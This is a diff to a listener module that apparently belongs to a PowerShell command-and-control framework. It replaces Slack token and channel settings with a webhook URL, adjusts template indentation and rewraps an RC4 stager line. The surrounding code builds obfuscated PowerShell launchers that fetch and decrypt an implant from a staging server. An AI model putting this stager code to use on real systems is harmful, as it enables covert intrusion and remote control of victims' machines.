@@ -143,15 +143,10 @@ class Listener(object):
                 'Required': False,
                 'Value': 'default'
             },
-            'SlackToken': {
-                'Description': 'Your SlackBot API token to communicate with your Slack instance.',
+            'SlackURL': {
+                'Description': 'Your Slack Incoming Webhook URL to communicate with your Slack instance.',
                 'Required': False,
                 'Value': ''
-            },
-            'SlackChannel': {
-                'Description': 'The Slack channel or DM that notifications will be sent to.',
-                'Required': False,
-                'Value': '#general'
             }
         }
         
@@ -290,7 +285,7 @@ class Listener(object):
             '	}',
             '',
             'a img {',
-            '    border:none;',
+            '	border:none;',
             '}',
             '',
             '-->',
@@ -433,8 +428,7 @@ class Listener(object):
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                 stager += "'%s');" % (stagingKey)
                 # this is the minimized RC4 stager code from rc4.ps1
-                stager += helpers.randomize_capitalization(
-                    '$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
+                stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL',
                                                              meta='STAGE0', additional='None', encData='')
